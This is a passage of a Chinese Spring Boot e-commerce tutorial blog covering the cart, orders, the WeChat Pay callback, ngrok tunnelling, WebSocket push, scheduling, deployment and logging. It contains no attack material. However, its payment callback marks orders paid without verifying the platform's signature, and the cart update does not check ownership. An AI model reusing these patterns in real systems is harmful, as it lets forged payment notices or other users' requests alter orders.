在详情页面判断如果用户未登录，则跳转到登录页面 introduction.html 17.2.3 登录页面接收回跳信息 login.html 17.2.4 回到详情页时接收参数 introduction.html 17.2.5 使用layui添加购物车成功/失败进行提示 引入layui layui.com &lt;!-- 引入 layui.css --&gt; &lt;link rel=\"stylesheet\" href=\"//unpkg.com/layui@2.6.5/dist/css/layui.css\"&gt; &lt;!-- 引入 layui.js --&gt; &lt;script src=\"//unpkg.com/layui@2.6.5/dist/layui.js\"&gt; 声明弹窗组件 当添加购物车成功或者失败的时候，进行提示： 十八、购物车—购物车列表18.1 流程分析 18.2 接口实现18.2.1 数据库实现 SQL -- 根据用户ID查询当前用户的购物车信息 select c.*, p.product_name,i.url from shopping_cart c INNER JOIN product p INNER JOIN product_img i ON c.product_id = p.product_id and i.item_id=p.product_id where user_id=6 and i.is_main=1; 实体类 在Mapper接口定义查询方法 @Repository public interface ShoppingCartMapper extends GeneralDAO&lt;ShoppingCart&gt; { public List&lt;ShoppingCartVO&gt; selectShopcartByUserId(int userId); } 映射配置 18.2.2 业务层实现 Service接口 Service实现类 18.2.3 控制层实现18.3 前端实现18.3.1 显示购物车列表18.3.2 显示购物车中商品价格十九、购物车-修改购物车数量19.1 流程分析19.2 接口实现 在Mapper接口定义修改方法 @Repository public interface ShoppingCartMapper extends GeneralDAO&lt;ShoppingCart&gt; { public List&lt;ShoppingCartVO&gt; selectShopcartByUserId(int userId); public int updateCartnumByCartid(@Param(\"cartId\") int cartId, @Param(\"cartNum\") int cartNum); } 映射配置 &lt;update id=\"updateCartnumByCartid\"&gt; update shopping_cart set cart_num=#{cartNum} where cart_id=#{cartId} &lt;/update&gt; Service接口 public interface ShoppingCartService { public ResultVO addShoppingCart(ShoppingCart cart); public ResultVO listShoppingCartsByUserId(int userId); public ResultVO updateCartNum(int cartId,int cartNum); } Service实现类 @Service public class ShoppingCartServiceImpl implements ShoppingCartService { @Autowired private ShoppingCartMapper shoppingCartMapper; private SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd hh:mm:ss\"); @Override public ResultVO updateCartNum(int cartId, int cartNum) { int i = shoppingCartMapper.updateCartnumByCartid(cartId, cartNum); if(i&gt;0){ return new ResultVO(ResStatus.OK,\"update success\",null); }else{ return new ResultVO(ResStatus.NO,\"update fail\",null); } } } 控制层实现 @PutMapping(\"/update/{cid}/{cnum}\") public ResultVO updateNum(@PathVariable(\"cid\") Integer cartId, @PathVariable(\"cnum\") Integer cartNum, @RequestHeader(\"token\") String token){ ResultVO resultVO = shoppingCartService.updateCartNum(cartId, cartNum); return resultVO; } 19.3 前端实现 为按钮添加点击事件 定义changeNum事件函数 二十、购物车—结算、提交订单 在购物车列表中选择对应的的商品之后，点击提交生成订单的过程 20.1 流程图 20.2 接口实现20.2.1 收货地址列表接口 此操作的数据库实现可以通过tkmapper通用方法完成 service接口UserAddrService public interface UserAddrService { public ResultVO listAddrsByUid(int userId); } Service实现类 UserAddrServiceImpl @Service public class UserAddrServiceImpl implements UserAddrService { @Autowired private UserAddrMapper userAddrMapper; @Transactional(propagation = Propagation.SUPPORTS) public ResultVO listAddrsByUid(int userId) { Example example = new Example(UserAddr.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"userId\",userId); criteria.andEqualTo(\"status\",1); List&lt;UserAddr&gt; userAddrs = userAddrMapper.selectByExample(example); ResultVO resultVO = new ResultVO(ResStatus.OK, \"success\", userAddrs); return resultVO; } } 控制器实现 @RestController @CrossOrigin @Api(value = \"提供收货地址相关接口\",tags = \"收货地址管理\") @RequestMapping(\"/useraddr\") public class UserAddrController { @Autowired private UserAddrService userAddrService; @GetMapping(\"/list\") @ApiImplicitParam(dataType = \"int\",name = \"userId\", value = \"用户ID\",required = true) public ResultVO listAddr(Integer userId, @RequestHeader(\"token\") String token){ ResultVO resultVO = userAddrService.listAddrsByUid(userId); return resultVO; } } 20.2.2 购物车记录列表接口 根据一个ID的集合，查询购物车记录，实现方式有两种： 动态sql &lt;select id=\"searchShoppingCartById\" resultMap=\"shopCartMap\"&gt; select * from shopping_cart where cart_id in &lt;foreach collection=\"list\" item=\"cid\" separator=\",\" open=\"(\" close=\")\"&gt; #{cid} &lt;/foreach&gt; &lt;/select&gt; tkMapper条件查询 criteria.andIn(“cartId”,ids); Mapper接口定义查询方法 映射配置(动态sql foreach) Service接口 Service实现类 控制器实现 @GetMapping(\"/listbycids\") @ApiImplicitParam(dataType = \"String\",name = \"cids\", value = \"选择的购物车记录id\",required = true) public ResultVO listByCids(String cids, @RequestHeader(\"token\")String token){ ResultVO resultVO = shoppingCartService.listShoppingCartsByCids(cids); return resultVO; } 20.2.3 保存订单20.3 前端实现20.3.1 选择购物车记录价格联动 列表前的复选框标签 渲染商品数量以及总价格 在vue示例的data中声明opts和totalPrice，并且监听opts选项的改变—选项一旦改变就计算总价格 20.3.2 点击“结算”跳转到订单添加页面 在购物车列表页面，选择购物车记录，点击“结算之后”将选择的购物车记录ID传递到order-add.html shopcart.html order-add.html 20.3.3 显示收货地址及订单商品20.3.4 订单确认页面选择地址二十一、订单提交及支付21.1 流程分析 21.2 订单添加接口实现21.2.1 数据库操作 根据收货地址ID，获取收货地址信息（tkMapper）：收货人姓名、电话、地址也可以从前端传递过来 根据购物车ID，查询购物车详情（需要关联查询商品名称、sku名称、库存、商品图片、商品价格） 改造：ShoppingCartMapper中的selectShopcartByCids 保存订单（tkMapper） 修改库存（tkMapper） 保存商品快照（tkMapper） 21.2.2 业务层实现@Service public class OrderServiceImpl implements OrderService { @Autowired private ShoppingCartMapper shoppingCartMapper; @Autowired private OrdersMapper ordersMapper; @Autowired private OrderItemMapper orderItemMapper; @Autowired private ProductSkuMapper productSkuMapper; /** * 保存订单业务 */ @Transactional public Map&lt;String,String&gt; addOrder(String cids,Orders order) throws SQLException { Map&lt;String,String&gt; map = new HashMap&lt;&gt;(); //1.校验库存：根据cids查询当前订单中关联的购物车记录详情（包括库存） String[] arr = cids.split(\",\"); List&lt;Integer&gt; cidsList = new ArrayList&lt;&gt;(); for (int i = 0; i &lt;arr.length ; i++) { cidsList.add(Integer.parseInt(arr[i])); } List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByCids(cidsList); boolean f = true; String untitled = \"\"; for (ShoppingCartVO sc: list) { if(Integer.parseInt(sc.getCartNum()) &gt; sc.getSkuStock()){ f = false; } //获取所有商品名称，以,分割拼接成字符串 untitled = untitled+sc.getProductName()+\",\"; } if(f){ //2.保存订单 order.setUntitled(untitled); order.setCreateTime(new Date()); order.setStatus(\"1\"); //生成订单编号 String orderId = UUID.randomUUID().toString().replace(\"-\", \"\"); order.setOrderId(orderId); int i = ordersMapper.insert(order); //3.生成商品快照 for (ShoppingCartVO sc: list) { int cnum = Integer.parseInt(sc.getCartNum()); String itemId = System.currentTimeMillis()+\"\"+ (new Random().nextInt(89999)+10000); OrderItem orderItem = new OrderItem(itemId, orderId, sc.getProductId(), sc.getProductName(), sc.getProductImg(), sc.getSkuId(), sc.getSkuName(), new BigDecimal(sc.getSellPrice()), cnum, new BigDecimal(sc.getSellPrice() * cnum), new Date(), new Date(), 0); orderItemMapper.insert(orderItem); } //4.扣减库存：根据套餐ID修改套餐库存量 for (ShoppingCartVO sc: list) { String skuId = sc.getSkuId(); int newStock = sc.getSkuStock()- Integer.parseInt(sc.getCartNum()); ProductSku productSku = new ProductSku(); productSku.setSkuId(skuId); productSku.setStock(newStock); productSkuMapper.updateByPrimaryKeySelective(productSku); } //5.删除购物车：当购物车中的记录购买成功之后，购物车中对应做删除操作 for (int cid: cidsList) { shoppingCartMapper.deleteByPrimaryKey(cid); } map.put(\"orderId\",orderId); map.put(\"productNames\",untitled); return map; }else{ //表示库存不足 return null; } } } 21.2.3 订单添加接口实现 订单保存 申请支付链接 @PostMapping(\"/add\") public ResultVO add(String cids, @RequestBody Orders order){ ResultVO resultVO = null; try { Map&lt;String, String&gt; orderInfo = orderService.addOrder(cids, order); String orderId = orderInfo.get(\"orderId\"); if(orderId!=null){ //设置当前订单信息 HashMap&lt;String,String&gt; data = new HashMap&lt;&gt;(); data.put(\"body\",orderInfo.get(\"productNames\")); //商品描述 data.put(\"out_trade_no\",orderId); //使用当前用户订单的编号作为当前支付交易的交易号 data.put(\"fee_type\",\"CNY\"); //支付币种 data.put(\"total_fee\",order.getActualAmount()*100+\"\"); //支付金额 data.put(\"trade_type\",\"NATIVE\"); //交易类型 data.put(\"notify_url\",\"/pay/success\"); //设置支付完成时的回调方法接口 //发送请求，获取响应 //微信支付：申请支付连接 WXPay wxPay = new WXPay(new MyPayConfig()); Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); orderInfo.put(\"payUrl\",resp.get(\"code_url\")); resultVO = new ResultVO(ResStatus.OK,\"提交订单成功！\",orderInfo); }else{ resultVO = new ResultVO(ResStatus.NO,\"提交订单失败！\",null); } } catch (SQLException e) { resultVO = new ResultVO(ResStatus.NO,\"提交订单失败！\",null); } catch (Exception e) { e.printStackTrace(); } return resultVO; } 21.3 前端提交订单信息 点击“提交订单”按钮，触发doSubmit order-add.html 21.4 支付回调 支付回调：当用户支付成功之后，支付平台会向我们指定的服务器接口发送请求传递订单支付状态数据 2.4.1 创建一个控制器定义回调接口@RestController @RequestMapping(\"/pay\") public class PayController { @Autowired private OrderService orderService; /** * 回调接口:当用户支付成功之后，微信支付平台就会请求这个接口，将支付状态的数据传递过来 * */ @RequestMapping(\"/callback\") public String paySuccess(HttpServletRequest request) throws Exception { System.out.println(\"--------------------callback\"); // 1.接收微信支付平台传递的数据（使用request的输入流接收） ServletInputStream is = request.getInputStream(); byte[] bs = new byte[1024]; int len = -1; StringBuilder builder = new StringBuilder(); while((len = is.read(bs))!=-1){ builder.append(new String(bs,0,len)); } String s = builder.toString(); //使用帮助类将xml接口的字符串装换成map Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(s); if(map!=null &amp;&amp; \"success\".equalsIgnoreCase(map.get(\"result_code\"))){ //支付成功 //2.修改订单状态为“待发货/已支付” String orderId = map.get(\"out_trade_no\"); int i = orderService.updateOrderStatus(orderId, \"2\"); System.out.println(\"--orderId:\"+orderId); //3.响应微信支付平台 if(i&gt;0){ HashMap&lt;String,String&gt; resp = new HashMap&lt;&gt;(); resp.put(\"return_code\",\"success\"); resp.put(\"return_msg\",\"OK\"); resp.put(\"appid\",map.get(\"appid\")); resp.put(\"result_code\",\"success\"); return WXPayUtil.mapToXml(resp); } } return null; } } 2.4.2 设置回调URL 在订单接口中申请支付连接的时候将回调接口的路径设置给微信支付平台 OrderController 思考：如果按照上图所示的配置，当用户支付成功之后，微信支付平台会向（http://192.168.55.3:8080/pay/callback）发送请求，因为我们的服务端项目是运行在本地计算机的（IP为内网IP），微信平台没办法访问 —— 内网穿透 21.5 Ngrok实现内网穿透21.5.1 注册帐号，申请隧道ID 注册 www.ngrok.cc 开通隧道 获取隧道ID：118c7bfe1ac90369 21.5.2 下载ngrok客户端 https://ngrok.cc/download.html 21.5.3 启动客户端 访问http://ytao.free.idcfengye.com就相当于访问本地的8080 21.6 前端通过轮询访问获取订单支付状态 流程图 接口实现 前端轮询访问接口 21.7 webSocket消息推送21.7.1 实现流程 21.7.2 创建webSocket服务器 添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-websocket&lt;/artifactId&gt; &lt;/dependency&gt; 添加websocket服务节点配置（Java配置方式） @Configuration public class WebSocketConfig { @Bean public ServerEndpointExporter getServerEndpointExporter(){ return new ServerEndpointExporter(); } } 创建websocket服务器 @Component @ServerEndpoint(\"/webSocket/{oid}\") public class WebSocketServer { private static ConcurrentHashMap&lt;String,Session&gt; sessionMap = new ConcurrentHashMap&lt;&gt;(); /**前端发送请求建立websocket连接，就会执行@OnOpen方法**/ @OnOpen public void open(@PathParam(\"oid\") String orderId, Session session){ sessionMap.put(orderId,session); } /**前端关闭页面或者主动关闭websocket连接，都会执行close**/ @OnClose public void close(@PathParam(\"oid\") String orderId){ sessionMap.remove(orderId); } public static void sendMsg(String orderId,String msg){ try { Session session = sessionMap.get(orderId); session.getBasicRemote().sendText(msg); }catch (Exception e){ e.printStackTrace(); } } } 21.7.3 在支付回调接口，通过订单id获取session返回结果@RestController @RequestMapping(\"/pay\") public class PayController { @Autowired private OrderService orderService; /** * 回调接口:当用户支付成功之后，微信支付平台就会请求这个接口，将支付状态的数据传递过来 */ @RequestMapping(\"/callback\") public String paySuccess(HttpServletRequest request) throws Exception { System.out.println(\"--------------------callback\"); // 1.接收微信支付平台传递的数据（使用request的输入流接收） ServletInputStream is = request.getInputStream(); byte[] bs = new byte[1024]; int len = -1; StringBuilder builder = new StringBuilder(); while((len = is.read(bs))!=-1){ builder.append(new String(bs,0,len)); } String s = builder.toString(); //使用帮助类将xml接口的字符串装换成map Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(s); if(map!=null &amp;&amp; \"success\".equalsIgnoreCase(map.get(\"result_code\"))){ //支付成功 //2.修改订单状态为“待发货/已支付” String orderId = map.get(\"out_trade_no\"); int i = orderService.updateOrderStatus(orderId, \"2\"); System.out.println(\"--orderId:\"+orderId); //3.通过websocket连接，向前端推送消息 WebSocketServer.sendMsg(orderId,\"1\"); //4.响应微信支付平台 if(i&gt;0){ HashMap&lt;String,String&gt; resp = new HashMap&lt;&gt;(); resp.put(\"return_code\",\"success\"); resp.put(\"return_msg\",\"OK\"); resp.put(\"appid\",map.get(\"appid\")); resp.put(\"result_code\",\"success\"); return WXPayUtil.mapToXml(resp); } } return null; } } 21.7.4 前端进入到支付页面时，就建立websocket连接//前端发送websocket连接请求 var webSocketUrl = webSocketBaseUrl + \"webSocket/\"+ this.orderInfo.orderId; var websocket = new WebSocket( webSocketUrl ); //只要后端通过websocket向此连接发消息就会触发onmessage事件 websocket.onmessage = function(event){ var msg = event.data; if(msg==\"1\"){ $(\"#div1\").html(\"&lt;label style='font-size:20px; color:green'&gt;订单支付完成！&lt;/label&gt;\"); } } 二十二、订单超时取消 订单超时取消，指的是当用户成功提交订单之后在规定时间内没有完成支付，则将订单关闭还原库存。 实现订单的超时取消业务通常有两种解决方案： 定时任务（quartz） 延时队列（MQ） 22.1 实现流程 22.2 quartz定时任务框架使用22.2.1 添加依赖&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-quartz&lt;/artifactId&gt; &lt;/dependency&gt; 22.2.2 创建定时任务 定时任务，每隔指定的时间就执行一次任务 案例：每隔3s就打印一次Helloworld @Component public class PrintHelloWorldJob { //https://cron.qqe2.com @Scheduled(cron = \"0/3 * * * * ?\") public void printHelloWorld(){ System.out.println(\"----hello world.\"); } } 22.2.3 在启动类开启定时任务@SpringBootApplication @EnableScheduling public class QuartzDemoApplication { public static void main(String[] args) { SpringApplication.run(QuartzDemoApplication.class, args); } } 22.3 实现订单超时取消22.3.1 在service子工程添加spring-boot-starter-quartz依赖22.3.2 在api自动启动类添加@EnableScheduling注解二十三、按类别查询商品23.1 流程分析 23.2 接口开发23.2.1 根据类别查询商品接口 数据库分析及SQL 数据库实现 实体类 ProductMapper接口 ProductSkuMapper 业务层实现 控制层实现 23.2.2 根据类别ID查询当前类别下所有商品的品牌 SQL -- 查询统计某个类别下所有商品的品牌：SQL select DISTINCT brand from product_params where product_id in (select product_id from product where category_id=49) 数据库实现 ProductMapper接口 映射配置 Service实现 Controller实现 23.3 前端实现二十四、商品搜索24.1 流程分析 24.2 接口实现24.2.1 模糊查询商品信息 数据库实现 ProductMapper 映射配置 Service实现 ProductServiceImpl Controller实现 24.2.2 根据关键字查询对应商品的品牌 SQL -- 根据关键字查询对应商品的品牌名称 select DISTINCT brand from product_params where product_id in (select product_id from product where product_name like '%小%') 数据库实现 ProductMapper 映射配置 Service实现 ProductServiceImpl Controller实现 24.3 前端实现二十五、用户中心25.1 用户中心登录校验25.1.1 校验token接口实现 UserController @ApiOperation(\"校验token是否过期接口\") @GetMapping(\"/check\") public ResultVO userTokencheck(@RequestHeader(\"token\") String token){ return new ResultVO(ResStatus.OK,\"success\",null); } token校验拦截器配置 @Configuration public class InterceptorConfig implements WebMvcConfigurer { @Autowired private CheckTokenInterceptor checkTokenInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(checkTokenInterceptor) .addPathPatterns(\"/shopcart/**\") .addPathPatterns(\"/orders/**\") .addPathPatterns(\"/useraddr/**\") .addPathPatterns(\"/user/check\"); //将接口配置到token校验拦截器 } } 25.1.2 前端用户中心首页校验token&lt;script type=\"text/javascript\"&gt; var baseUrl = \"http://localhost:8080/\" var vm = new Vue({ el:\"#div1\", data:{ token:\"\", username:\"\", userImg:\"\" }, created:function(){ //从cookie中获取用户信息（token、用户id、用户名、头像） this.token = getCookieValue(\"token\"); if(this.token == null){ window.location.href = \"login.html?returnUrl=user-center.html\"; }else{ //如果登录过期需要重新登录，创建一个校验用户登录的接口，通过请求这个接口进行token的检验 //请求user/check接口 var url1 = baseUrl+\"user/check\"; axios({ url:url1, method:\"get\", headers:{ token:this.token } }).then((res)=&gt;{ if(res.data.code == 10000){ //token校验通过 this.username = getCookieValue(\"username\"); this.userImg = getCookieValue(\"userImg\"); }else{ window.location.href = \"login.html?returnUrl=user-center.html\"; } }); } } }); &lt;/script&gt; 25.2 用户中心的订单管理25.2.1 流程分析25.2.2 接口实现 数据库实现 根据用户的ID分页查询当前用户的订单信息、关联查询订单中的商品快照 根据用户的ID和订单状态分页查询当前用户的订单信息、关联查询订单中的商品快照 封装OrdersVO OrderMapper 映射配置 Service实现 OrderServiceImpl 控制器实现 25.2.3 前端实现https://www.processon.com/view/link/606bde8b1e08534321fd2103 二十六、项目云部署26.1 项目部署介绍 项目部署就是将开发—测试完成的项目运行在生产环境中 多种的部署环境是为了实现数据的隔离、对数据进行保护 开发环境：windows （有非常便利的可视化操作系统） 生产环境：Linux （开源免费、系统开销小、安全性高） 开发环境（windows） 应用服务器 Tomcat-windows 数据库服务器 MySQL-Linux/windows 测试环境（模拟的生产环境） 应用服务器 Tomcat-Linux 数据库服务器 Tomcat-Linux 生产环境（需要进行保护的、不能被破坏的） 应用服务器 Tomcat-Linux 数据库服务器 Tomcat-Linux 26.2 后端项目部署1.搭建云服务器环境 JDK MySQL 2.maven聚合工程打包 3.上传到云服务器4.启动项目java -jar api-2.0.1.jar &amp; 26.3 前端项目部署（tomcat） 前端项目也需要部署在服务器上，才能够提供多用户访问 tomcat可以作为前端项目部署的服务器使用 安装Tomcat，配置port 为 9999 将前端项目上传到tomcat/webapps中 启动Tomcat 访问：http://47.118.45.73:9999/fmall-static/index.html 使用Tomcat部署前端项目存在的问题： 1.前端项目的一个页面会包含大量的css\\js\\图片，会有大量的并发请求，Tomcat难以满足并发的需求 2.Tomcat的核心价值在于能够便于执行Java程序，而不是处理并发，同时前端项目中没有Java程序，从功能上讲前端项目的部署也用不着Tomcat 结论：使用Tomcat作为部署前端项目的服务器是不合适的。 26.4 前端项目部署（Nginx）在Linux安装Nginx 修改前端项目的baseUrl 将前端项目上传到nginx目录 配置nginx的访问路径 二十七、项目日志管理27.1 日志框架的概念 在项目开发、运维过程中，为了能够清晰的知道项目在服务器中的运行过程、便于查找服务器运行过程的异常原因，我们需要对系统运行过程进行记录 — 运行日志 我们可以使用 控制台输出 的形式进行运行过程记录（不便于日志信息跟踪和维护、不能够持久化存储） 控制台输出日志的诸多弊端 催化了 日志框架的诞生 日志框架 用于帮助我们在应用开发中完成日志记录的帮助类 日志框架作用 1.有结构的记录日志信息（结构是为了提升日志信息的可读性） 2.定义日志的输出策略（每个日志文件最大5m、每天一个日志文件） 27.2 日志框架规范 日志框架规范：日志记录实现的规则 日志框架：实现日志记录 日志接口（日志框架规范） JCL（Jakatra Commons Logging） SLF4J（Simple Logging Facade For Java ） JBoss Logging 日志实现（日志框架） Log4j Logback 27.3 SLF4J SLF4J（Simple Logging Facade For Java ）简单日志门面，定义了一套日志规范，并不是日志框架解决方法。 SLF4J的实现框架 27.4 slf4j-simple 创建springBoot应用 移出springboot应用默认logback-classic的日志依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; 添加依赖 &lt;!-- https://mvnrepository.com/artifact/org.slf4j/slf4j-simple --&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt; &lt;version&gt;1.7.25&lt;/version&gt; &lt;/dependency&gt; 在service层打印日志 @Service public class TestServiceImpl implements TestService { private Logger logger = LoggerFactory.getLogger(TestServiceImpl.class); @Override public void testLog() { //日志记录 //System.out.println(\"日志信息\"); logger.info(\"订单添加完成\"); } } 27.5 log4j使用介绍 log4j没有实现slf4j,如果基于slf4j规范使用log4j，则需要添加slf4j-log4j12依赖 添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;1.7.25&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; 在resources目录下创建log4j.properties文件 log4j.rootLogger=DEBUG,stdout # MyBatis logging configuration... log4j.logger.org.mybatis.example.BlogMapper=TRACE # Console output... log4j.appender.stdout=org.apache.log4j.ConsoleAppender log4j.appender.stdout.layout=org.apache.log4j.PatternLayout log4j.appender.stdout.layout.ConversionPattern=[%t] %5p - %n%m 27.6 基于SpringBoot应用的logback日志配置 SpringBoot默认整合了logback-classic日志框架，我们需要对logback日志框架进行配置以自定义日志输出格式、日志文件配置、日志文件保存策略等信息 logback配置 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;configuration&gt; &lt;appender name=\"stdout\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt; &lt;encoder&gt; &lt;springProfile name=\"dev\"&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;springProfile name=\"!dev\"&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;!--日志的编码格式--&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--这个就表示的是要把 日志输出到文件(FileAppender)--&gt; &lt;appender name=\"file\" class=\"ch.qos.logback.core.FileAppender\"&gt; &lt;file&gt;D:/log/output.log&lt;/file&gt; &lt;!--设置日志是否追加--&gt; &lt;append&gt;true&lt;/append&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss.SSS} %level [%thread]-%class:%line&gt;&gt;%msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!--设置日志写入是否线程安全--&gt; &lt;prudent&gt;false&lt;/prudent&gt; &lt;/appender&gt; &lt;appender name=\"timeFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt; &lt;!--TimeBasedRollingPolicy 基于时间的滚动策略--&gt; &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt; &lt;fileNamePattern&gt;d:/log/log-%d{yyyy-MM-dd-HH}.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss.SSS} %level [%thread]-%class:%line&gt;&gt;%msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name=\"fixedFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt; &lt;file&gt;d:/log/fixedFile.log&lt;/file&gt; &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.FixedWindowRollingPolicy\"&gt; &lt;fileNamePattern&gt;log/fixedFile%i.log&lt;/fileNamePattern&gt; &lt;minIndex&gt;1&lt;/minIndex&gt; &lt;maxIndex&gt;10&lt;/maxIndex&gt; &lt;/rollingPolicy&gt; &lt;!--SizeBasedTriggeringPolicy--&gt; &lt;triggeringPolicy class=\"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy\"&gt; &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt; &lt;/triggeringPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss.SSS} %level [%thread]-%class:%line&gt;&gt;%msg%n &lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;root level=\"info\"&gt; &lt;appender-ref ref=\"stdout\" /&gt; &lt;appender-ref ref=\"timeFile\"/&gt; &lt;/root&gt; &lt;/configuration&gt; 27.7 在锋迷商城项目进行日志配置27.7.1 在api子工程的resources目录添加日志配置文件 logback-spring.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;configuration&gt; &lt;appender name=\"stdout\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt; &lt;encoder&gt; &lt;springProfile name=\"dev\"&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;springProfile name=\"!dev\"&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;!--日志的编码格式--&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name=\"timeFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt; &lt;!--TimeBasedRollingPolicy 基于时间的滚动策略--&gt; &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt; &lt;!--日志文件的存储路径--&gt; &lt;fileNamePattern&gt;log/log-%d{yyyy-MM-dd-HH}.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss.SSS} %level [%thread]-%class:%line&gt;&gt;%msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;root level=\"info\"&gt; &lt;appender-ref ref=\"stdout\"/&gt; &lt;appender-ref ref=\"timeFile\"/&gt; &lt;/root&gt; &lt;/configuration&gt; 27.7.2 在sercie实现类创建Logger对象，输入日志","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"Springboot项目","slug":"Springboot项目","permalink":"https://bigbug888.github.io/tags/Springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"博客与博主","slug":"01-博客诞生","date":"2020-05-27T13:00:00.000Z","updated":"2021-11-25T19:25:41.512Z","comments":true,"path":"posts/1.html","link":"","permalink":"https://bigbug888.github.io/posts/1.html","excerpt":"","text":"相遇皆是缘分 为什么建博客？肿么说了! 纯属个人兴趣，好玩，唉，就是玩!嘻嘻! 会有些成就感吧,拥有一个自己的博客写一些自己感兴趣的事或物,不是一件很酷的事嘛! 展望博客我会整理一些个人所学的知识（学前端的，也会捣鼓捣鼓一些其它的专业的知识）或生活方面有兴趣的事发到博客上供大家观摩 溜溜球啦！","categories":[{"name":"生活","slug":"生活","permalink":"https://bigbug888.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"想法","slug":"想法","permalink":"https://bigbug888.github.io/tags/%E6%83%B3%E6%B3%95/"}]}],"categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"},{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"},{"name":"生活","slug":"生活","permalink":"https://bigbug888.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"},{"name":"web","slug":"web","permalink":"https://bigbug888.github.io/tags/web/"},{"name":"Springboot项目","slug":"Springboot项目","permalink":"https://bigbug888.github.io/tags/Springboot%E9%A1%B9%E7%9B%AE/"},{"name":"想法","slug":"想法","permalink":"https://bigbug888.github.io/tags/%E6%83%B3%E6%B3%95/"}]}